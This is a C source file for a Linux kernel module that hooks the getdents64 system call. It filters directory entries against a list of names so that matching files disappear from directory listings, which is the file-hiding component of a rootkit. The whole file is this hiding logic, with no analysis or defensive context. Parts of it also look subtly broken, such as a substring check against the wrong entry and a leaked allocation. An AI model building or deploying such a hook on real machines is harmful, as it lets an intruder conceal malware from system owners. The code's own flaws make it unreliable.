#include "getdents64.h"
#include "../shared.h"
#include "linux/kern_levels.h"
#include "linux/slab.h"
#include "linux/uaccess.h"
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/version.h>

asmlinkage long (*real_sys_getdents64)(struct pt_regs *regs);
asmlinkage long getdents64_hook(struct pt_regs *regs) {
  int ret = real_sys_getdents64(regs);

  unsigned long offset = 0;

  struct linux_dirent64 __user *uspace_dirent = (void __user *)regs->si;
  struct linux_dirent64 *kspace_dirent, *current_dirent, *previous_dir = NULL;

  kspace_dirent = kzalloc(ret, GFP_KERNEL);

  if (copy_from_user(kspace_dirent, uspace_dirent, ret)) {
    printk(KERN_ERR
           "hooked_getdents64: failed to copy dirent from user space\n");
    return ret;
  }

  struct filter_word *element;

  while (offset < ret) {
    list_for_each_entry(element, &filter_words, list) {
      current_dirent = (void *)kspace_dirent + offset;

      unsigned long prefix_len = strlen(element->name);
      unsigned long name_len = strlen(current_dirent->d_name);

      if (name_len < prefix_len) {
        previous_dir = current_dirent;
        offset += current_dirent->d_reclen;
        continue;
      }

      if (memcmp(&element->name, current_dirent->d_name,
                 strlen(element->name)) == 0 ||
          (strstr(kspace_dirent->d_name, element->name) != NULL)) {

        ret -= (unsigned long)current_dirent->d_reclen;

        if (current_dirent == kspace_dirent) {
          printk(KERN_INFO
                 "hooked_getdents64: dirent=%p, Dir name: %s, Dir type: %u",
                 &current_dirent, current_dirent->d_name,
                 current_dirent->d_type);
          memmove(current_dirent,
                  (void *)current_dirent + current_dirent->d_reclen,
                  ret + offset);
          continue;
        }

        previous_dir->d_reclen += current_dirent->d_reclen;
        printk(KERN_INFO
               "hooked_getdents64: dirent=%p, Dir name: %s, Dir type: %u",
               &current_dirent, current_dirent->d_name, current_dirent->d_type);
      } else {
        printk(KERN_ERR "No dir found");

        previous_dir = current_dirent;
      }
    }

    offset += current_dirent->d_reclen;
  }

  if (copy_to_user(uspace_dirent, kspace_dirent, ret)) {
    printk(
        KERN_ERR
        "hooked_getdents64: failed to copy dirent from kernel to user space\n");
    return ret;
  };

  kfree(kspace_dirent);
  return ret;
}
